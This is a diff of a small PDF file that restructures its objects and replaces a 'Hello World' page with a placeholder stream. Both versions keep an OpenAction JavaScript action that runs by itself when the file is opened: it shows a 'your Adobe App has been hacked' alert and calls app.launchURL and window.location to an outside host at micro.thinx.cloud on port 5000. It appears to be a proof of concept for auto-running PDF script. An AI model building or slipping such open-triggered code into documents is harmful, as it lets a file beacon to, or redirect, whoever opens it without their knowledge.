@@ -1,69 +1,67 @@
-%PDF-1.1
+%PDF-1.4
 %öäüß
 1 0 obj
 <<
 /Type /Catalog
-/Pages 2 0 R
-/OpenAction 3 0 R
+/Outlines 2 0 R
+/Pages 3 0 R
+/OpenAction 4 0 R
 >>
 endobj
 2 0 obj
 <<
-/Type /Pages
-/Kids [4 0 R]
-/Count 1
-/MediaBox [0 0 300 144]
+/Count 0
 >>
 endobj
 3 0 obj
+<<
+/Type /Pages
+/Kids [5 0 R]
+/Count 1
+>>
+endobj
+4 0 obj
 <<
 /Type /Action
 /S /JavaScript
 /JS (app.alert\("Congratulations, your Adobe App has been hacked!"\);\napp.launchURL\("http://micro.thinx.cloud:5000/images/transparent.png", true\);\n\nalert\("Congratulations, your browser has been hacked."\);\nwindow.location\("http://micro.thinx.cloud:5000/images/transparent.png", true\);\n)
 >>
 endobj
-4 0 obj
-<<
-/Type /Page
-/Parent 2 0 R
-/Resources <<
-/Font <<
-/F1 <<
-/Type /Font
-/Subtype /Type1
-/BaseFont /Times-Roman
->>
->>
->>
-/Contents 5 0 R
->>
-endobj
 5 0 obj
 <<
-/Length 55
+/Type /Page
+/Parent 3 0 R
+/MediaBox [0 0 612 792]
+/Contents 6 0 R
+/Resources <<
+/ProcSet [/PDF]
+>>
+>>
+endobj
+6 0 obj
+<<
+/Length 35
 >>
 stream
-  BT
-    /F1 18 Tf
-    0 0 Td
-    (Hello World) Tj
+â€¦ Page-marking operators â€¦
 
 endstream
 endobj
 xref
-0 6
+0 7
 0000000000 65535 f
 0000000015 00000 n
-0000000082 00000 n
-0000000163 00000 n
-0000000510 00000 n
-0000000663 00000 n
+0000000098 00000 n
+0000000128 00000 n
+0000000185 00000 n
+0000000532 00000 n
+0000000652 00000 n
 trailer
 <<
+/Size 7
 /Root 1 0 R
-/Size 6
-/ID [<F3269266D7A7BE1869441C7B2EE3A691> <F3269266D7A7BE1869441C7B2EE3A691>]
+/ID [<5956449019703358012F0149DEE4810B> <5956449019703358012F0149DEE4810B>]
 >>
 startxref
-770
+736
 %%EOF
